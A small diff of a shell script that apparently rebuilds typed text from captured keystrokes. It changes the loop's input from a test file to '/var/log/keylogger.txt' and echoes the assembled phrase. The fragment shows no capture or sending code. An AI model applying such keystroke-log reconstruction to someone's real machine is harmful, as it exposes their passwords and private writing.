@@ -81,5 +81,5 @@ do
     key=`echo "$key" | cut -d \' -f 2`
 	phrase=`echo "${phrase}${key}"`
     old=$time0
-done < test0.txt
+done < /var/log/keylogger.txt
 echo $phrase
